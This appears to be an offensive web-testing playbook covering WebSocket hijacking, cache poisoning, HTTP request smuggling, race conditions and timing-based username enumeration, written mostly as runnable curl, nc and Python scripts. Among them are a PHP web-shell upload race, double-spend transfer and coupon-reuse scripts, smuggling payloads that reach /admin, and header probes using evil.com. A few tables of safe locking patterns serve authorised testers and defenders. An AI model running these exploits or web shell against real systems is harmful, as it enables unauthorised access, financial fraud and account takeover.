# Advanced Web Attacks

Techniques for WebSocket, cache poisoning, HTTP smuggling, and race conditions. Use during Phase 5 (Vuln Assessment) and Phase 6 (Exploitation).

---

## 1. WebSocket Security Testing

### Detection
```bash
# Find WebSocket endpoints
curl -sk "https://target.com" | grep -ioE "wss?://[^\"' ]+"
# Check upgrade response
curl -sk -H "Upgrade: websocket" -H "Connection: Upgrade" -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" "https://target.com/ws" -I
```

### Auth Bypass
```bash
# Connect without auth token
wscat -c "wss://target.com/ws"

# Connect with expired/invalid token
wscat -c "wss://target.com/ws" -H "Authorization: Bearer expired_token"

# Cross-origin WebSocket hijacking (CSWSH)
# Check if Origin header is validated:
wscat -c "wss://target.com/ws" -H "Origin: https://evil.com"
```

### IDOR via WebSocket
```bash
# Subscribe to other users' channels
wscat -c "wss://target.com/ws"
# Then send: {"action":"subscribe","channel":"user_123"}
# Try: {"action":"subscribe","channel":"user_456"}  (other user)
```

### Message Injection
```bash
# Test for unvalidated message types
wscat -c "wss://target.com/ws"
# Send: {"type":"admin_action","command":"list_users"}
# Send: {"type":"debug","sql":"SELECT * FROM users"}
```

### Python WebSocket Tester
```python
import asyncio, websockets, json

async def ws_test(url, messages):
    async with websockets.connect(url) as ws:
        for msg in messages:
            await ws.send(json.dumps(msg))
            resp = await asyncio.wait_for(ws.recv(), timeout=5)
            print(f"Sent: {msg}\nRecv: {resp}\n")

# IDOR test
asyncio.run(ws_test("wss://target.com/ws", [
    {"action": "get_profile", "user_id": 1},
    {"action": "get_profile", "user_id": 2},
    {"action": "get_profile", "user_id": 999},
]))
```

---

## 2. Cache Poisoning

### Unkeyed Header Detection
```bash
# Find headers that affect response but aren't in cache key
# Add unique header, check if response changes:
curl -sk "https://target.com/" -H "X-Forwarded-Host: evil.com" | grep "evil.com"
curl -sk "https://target.com/" -H "X-Forwarded-Scheme: http" -I | grep "Location"
curl -sk "https://target.com/" -H "X-Original-URL: /admin" | head -20

# Common unkeyed headers to test:
HEADERS=(
  "X-Forwarded-Host: evil.com"
  "X-Forwarded-Scheme: nothttps"
  "X-Forwarded-Proto: http"
  "X-Original-URL: /anything"
  "X-Rewrite-URL: /admin"
  "X-Host: evil.com"
  "X-Forwarded-Server: evil.com"
  "X-HTTP-Method-Override: POST"
  "X-Forwarded-Port: 443"
  "X-Wap-Profile: http://evil.com/wap.xml"
)

for h in "${HEADERS[@]}"; do
  echo "Testing: $h"
  curl -sk "https://target.com/" -H "$h" -D - -o /dev/null 2>/dev/null | head -5
  echo "---"
done
```

### Web Cache Deception
```bash
# Trick cache into storing authenticated page
# Append static extension to dynamic path:
curl -sk "https://target.com/account/settings/nonexistent.css" -H "Cookie: session=VICTIM"
# Then access without auth:
curl -sk "https://target.com/account/settings/nonexistent.css"

# Variations:
curl -sk "https://target.com/api/me/anything.js"
curl -sk "https://target.com/profile/x.png"
curl -sk "https://target.com/account%2f..%2fstatic/x.css"
```

### Cache Key Manipulation
```bash
# Parameter pollution — different cache key, same backend behavior
curl -sk "https://target.com/page?cb=1" -H "X-Forwarded-Host: evil.com"
# Wait for cache, then:
curl -sk "https://target.com/page?cb=1"  # Should serve poisoned version

# Fat GET (body in GET request)
curl -sk "https://target.com/api/data" -X GET -H "Content-Type: application/json" \
  -d '{"admin":true}'
```

---

## 3. HTTP Request Smuggling

### Detection
```bash
# CL.TE detection (front-end uses Content-Length, back-end uses Transfer-Encoding)
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX' | nc target.com 80

# TE.CL detection (front-end uses Transfer-Encoding, back-end uses Content-Length)
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nZ\r\nQ' | nc target.com 80

# Timing-based detection
# CL.TE: if vulnerable, second request will timeout
curl -sk "https://target.com/" -X POST \
  -H "Content-Length: 4" \
  -H "Transfer-Encoding: chunked" \
  -d $'0\r\n\r\nX' --max-time 5

# H2.CL (HTTP/2 downgrade smuggling)
# Use h2csmuggler or smuggler.py tools
```

### Exploitation
```bash
# Smuggle request to access /admin
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 71\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\nX-Ignore: ' | nc target.com 80

# Capture other users' requests (reflected XSS via smuggling)
# Smuggle a POST that stores the next user's request in a parameter
```

### Tools
```bash
# smuggler (Python)
python3 smuggler.py -u "https://target.com/"

# h2csmuggler (HTTP/2 cleartext smuggling)
python3 h2csmuggler.py -x "https://target.com/" "https://target.com/admin"
```

---

## 4. Race Conditions

### Single-Endpoint Race (e.g., double-spend, coupon reuse)
```python
#!/usr/bin/env python3
"""Race condition exploit — single endpoint"""
import asyncio, aiohttp, sys

TARGET = "https://target.com/api/redeem-coupon"
HEADERS = {"Authorization": "Bearer TOKEN", "Content-Type": "application/json"}
PAYLOAD = {"coupon_code": "DISCOUNT50"}
CONCURRENT = 20

async def send_request(session, i):
    async with session.post(TARGET, json=PAYLOAD, headers=HEADERS, ssl=False) as resp:
        body = await resp.text()
        print(f"[{i}] {resp.status}: {body[:80]}")
        return resp.status

async def main():
    connector = aiohttp.TCPConnector(limit=CONCURRENT, force_close=True)
    async with aiohttp.ClientSession(connector=connector) as session:
        # Warm up connections
        tasks = [send_request(session, i) for i in range(CONCURRENT)]
        # Fire all at once
        results = await asyncio.gather(*tasks, return_exceptions=True)
        success = sum(1 for r in results if r == 200)
        print(f"\nSuccess: {success}/{CONCURRENT}")

asyncio.run(main())
```

### Multi-Endpoint Race (e.g., TOCTOU — check vs use)
```python
#!/usr/bin/env python3
"""Race condition — TOCTOU between balance check and transfer"""
import asyncio, aiohttp

CHECK_URL = "https://target.com/api/balance"
TRANSFER_URL = "https://target.com/api/transfer"
HEADERS = {"Authorization": "Bearer TOKEN", "Content-Type": "application/json"}

async def race_transfer(session):
    """Send transfer immediately after balance check"""
    # These fire near-simultaneously
    tasks = [
        session.get(CHECK_URL, headers=HEADERS, ssl=False),
        session.post(TRANSFER_URL, json={"amount": 1000, "to": "attacker"}, headers=HEADERS, ssl=False),
        session.post(TRANSFER_URL, json={"amount": 1000, "to": "attacker"}, headers=HEADERS, ssl=False),
        session.post(TRANSFER_URL, json={"amount": 1000, "to": "attacker"}, headers=HEADERS, ssl=False),
    ]
    responses = await asyncio.gather(*[asyncio.ensure_future(t) for t in tasks])
    for i, resp in enumerate(responses):
        body = await resp.text()
        print(f"[{i}] {resp.status}: {body[:80]}")

async def main():
    async with aiohttp.ClientSession() as session:
        await race_transfer(session)

asyncio.run(main())
```

### Turbo Intruder (Burp Extension) Script
```python
# For Burp Suite Turbo Intruder
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=30,
                          requestsPerConnection=100,
                          pipeline=False)
    for i in range(30):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')  # Release all at once

def handleResponse(req, interesting):
    table.add(req)
```

### Race Condition Tech-Stack Signals

Before investing time in race condition testing, identify whether the target's tech stack is likely vulnerable based on common concurrency patterns:

| Tech Stack | Vulnerable Pattern | Safe Pattern | Signal to Look For |
|---|---|---|---|
| Ruby on Rails | `Model.find` → update without `with_lock` | `with_lock { }`, `find_by_sql('SELECT ... FOR UPDATE')` | X-Runtime header, Rails version in cookies |
| Node.js/Express | `async/await` read-then-write without mutex | Redis WATCH/MULTI, database transactions | X-Powered-By: Express, async response patterns |
| PHP (Laravel/Symfony) | `$model->save()` without `lockForUpdate()` | `DB::transaction(function() { ... ->lockForUpdate() })` | X-Powered-By: PHP, Laravel debug headers |
| Python (Django/Flask) | `obj.save()` without `select_for_update()` | `with transaction.atomic(): Model.objects.select_for_update()` | X-Framework: Django, Server: gunicorn/uvicorn |
| Java (Spring) | `@Transactional` without `PESSIMISTIC_WRITE` | `@Lock(LockModeType.PESSIMISTIC_WRITE)`, `synchronized` | X-Application-Context, Java stack traces |
| Go | Goroutine read-then-write without sync.Mutex | `sync.Mutex`, `database/sql` with `FOR UPDATE` | Server: Go-HTTP, fast response times |
| .NET | `async Task` without `SemaphoreSlim` | `lock() { }`, `IsolationLevel.Serializable` | X-AspNet-Version, X-Powered-By: ASP.NET |

### High-Value Race Condition Targets

Prioritize these endpoint patterns (highest ROI):

| Endpoint Pattern | What to Race | Impact if Successful |
|---|---|---|
| `/api/redeem`, `/api/coupon/apply` | Apply same coupon N times simultaneously | Financial: N× discount |
| `/api/transfer`, `/api/withdraw` | Submit same transfer N times | Financial: N× payout |
| `/api/vote`, `/api/like` | Submit same vote N times | Integrity: vote manipulation |
| `/api/invite/accept` | Accept invite + change role simultaneously | Privilege escalation |
| `/api/cart/checkout` | Checkout + modify cart simultaneously | Get items at wrong price |
| `/api/account/email` | Change email + trigger password reset | Account takeover |
| `/api/2fa/verify` | Submit multiple OTP guesses simultaneously | MFA bypass |

### HTTP/2 Single-Packet Attack

The most reliable race condition technique (2024+):

```python
import asyncio
import httpx

async def race_single_packet(url, headers, data, n=10):
    """Send N requests in a single TCP packet via HTTP/2 multiplexing."""
    async with httpx.AsyncClient(http2=True, verify=False) as client:
        # Prepare all requests
        tasks = [
            client.post(url, headers=headers, json=data)
            for _ in range(n)
        ]
        # Fire simultaneously
        responses = await asyncio.gather(*tasks)
        
        for i, r in enumerate(responses):
            print(f"  [{i}] {r.status_code} — {r.text[:100]}")
        
        return responses

# Usage
asyncio.run(race_single_packet(
    "https://target.com/api/redeem",
    {"Authorization": "Bearer TOKEN"},
    {"coupon_code": "DISCOUNT50"},
    n=10
))
```

### Last-Byte Synchronization (Manual)

When HTTP/2 isn't available and Turbo Intruder isn't an option:

```text
Technique:
1. Send all requests EXCEPT the final byte of each body
2. Server holds all connections open, waiting for complete request
3. Send all final bytes simultaneously (single write per socket)
4. All requests complete processing at the same instant

Why it works:
- TCP Nagle's algorithm batches small writes
- Server can't start processing until full Content-Length received
- Releasing all final bytes in one syscall achieves sub-millisecond sync
```

```python
#!/usr/bin/env python3
"""Last-byte sync race condition (no HTTP/2 required)"""
import socket, ssl, threading, time

TARGET = "target.com"
PORT = 443
PATH = "/api/redeem"
BODY = '{"coupon":"DISCOUNT50"}'
COOKIE = "session=abc123"
N = 20

def build_request():
    req = (
        f"POST {PATH} HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"Cookie: {COOKIE}\r\n"
        f"Content-Type: application/json\r\n"
        f"Content-Length: {len(BODY)}\r\n"
        f"\r\n"
        f"{BODY[:-1]}"  # Everything except last byte
    )
    return req.encode(), BODY[-1].encode()

def race_worker(barrier, results, idx):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    sock = ctx.wrap_socket(socket.socket(), server_hostname=TARGET)
    sock.connect((TARGET, PORT))
    
    req_partial, last_byte = build_request()
    sock.send(req_partial)
    
    # Wait for all threads to be ready
    barrier.wait()
    
    # Send last byte simultaneously
    sock.send(last_byte)
    
    # Read response
    resp = sock.recv(4096).decode(errors='ignore')
    status = resp.split(' ')[1] if ' ' in resp else '???'
    results[idx] = status
    sock.close()

barrier = threading.Barrier(N)
results = [''] * N
threads = [threading.Thread(target=race_worker, args=(barrier, results, i)) for i in range(N)]

for t in threads:
    t.start()
for t in threads:
    t.join()

print(f"Results: {dict((s, results.count(s)) for s in set(results))}")
```

### File Upload Race (TOCTOU)

Exploit the window between file upload and server-side validation/deletion:

```python
#!/usr/bin/env python3
"""Race: upload malicious file + access before validation deletes it"""
import threading, requests

TARGET_UPLOAD = "https://target.com/upload"
TARGET_ACCESS = "https://target.com/uploads/shell.php"
COOKIES = {"session": "abc123"}

def upload():
    files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>', 'image/png')}
    requests.post(TARGET_UPLOAD, files=files, cookies=COOKIES, verify=False)

def access():
    for _ in range(200):
        r = requests.get(f"{TARGET_ACCESS}?cmd=id", cookies=COOKIES, verify=False)
        if "uid=" in r.text:
            print(f"SUCCESS: {r.text.strip()}")
            return True
    return False

# Run upload + rapid access simultaneously
for attempt in range(10):
    t1 = threading.Thread(target=upload)
    t2 = threading.Thread(target=access)
    t1.start()
    t2.start()
    t1.join()
    t2.join()
```

**When to try:** File upload exists + server validates AFTER saving (check by uploading `.php` — if you get "file type not allowed" but the file briefly exists at the upload path, it's vulnerable).

### OAuth State Race

```text
Attack scenario:
1. Initiate OAuth flow → receive state token
2. Send multiple parallel callbacks with the SAME authorization code + state
3. If state is consumed non-atomically:
   - Multiple accounts get linked to victim's OAuth
   - Or: same auth code exchanged multiple times for different tokens

Test:
- Capture OAuth callback URL (with code= and state=)
- Replay it 20x in parallel
- Check if multiple sessions/accounts are created

Impact: Account linking abuse, session multiplication
```

### curl One-Liner for Quick Race Test

```bash
# GNU Parallel (most accessible)
seq 1 50 | parallel -j 50 "curl -s -o /dev/null -w '%{http_code}\n' \
  -X POST 'https://target.com/api/redeem' \
  -H 'Cookie: session=abc123' \
  -H 'Content-Type: application/json' \
  -d '{\"code\":\"SINGLE-USE\"}'"

# Count successes
seq 1 50 | parallel -j 50 "curl -s -X POST 'https://target.com/api/redeem' \
  -H 'Cookie: session=abc123' -d 'code=SINGLE-USE'" | grep -c "success"
```

### Validation Requirements

**A race condition is confirmed when:**
- The operation succeeds MORE times than it should (e.g., coupon applied 3x instead of 1x)
- Reproducible in at least 3/5 attempts
- The effect is observable in the application state (check balance, check applied coupons, etc.)

**NOT a race condition:**
- Getting N identical responses (server may process sequentially but return same cached response)
- Getting N 200 responses without verifying the SIDE EFFECT occurred N times
- Single successful duplicate (could be eventual consistency, not a race)

---

## 5. Timing Side-Channels

### Username Enumeration via Timing
```python
#!/usr/bin/env python3
"""Detect valid usernames via response time difference"""
import requests, time, statistics

LOGIN_URL = "https://target.com/api/login"
KNOWN_INVALID = "definitelynotauser12345"
TEST_USERS = ["admin", "root", "test", "user", "john.doe"]

def measure_login(username, n=5):
    times = []
    for _ in range(n):
        start = time.time()
        requests.post(LOGIN_URL, json={"username": username, "password": "wrong"}, verify=False)
        times.append(time.time() - start)
    return statistics.median(times)

baseline = measure_login(KNOWN_INVALID)
print(f"Baseline (invalid user): {baseline:.3f}s")

for user in TEST_USERS:
    t = measure_login(user)
    delta = t - baseline
    flag = " *** LIKELY VALID" if delta > 0.05 else ""
    print(f"{user}: {t:.3f}s (delta: {delta:+.3f}s){flag}")
```

---

## Quick Decision: Which Attack to Try

| Signal | Attack |
|--------|--------|
| CDN/reverse proxy in front | Cache poisoning, HTTP smuggling |
| WebSocket endpoint found | WS auth bypass, CSWSH, IDOR |
| Financial transaction endpoint | Race condition (double-spend) |
| Login/registration endpoint | Timing side-channel, race (duplicate) |
| Multiple backend servers | HTTP smuggling (CL.TE/TE.CL) |
| Static file caching (CDN) | Web cache deception |
| Coupon/promo/referral system | Race condition |
| HTTP/2 enabled | H2.CL smuggling |
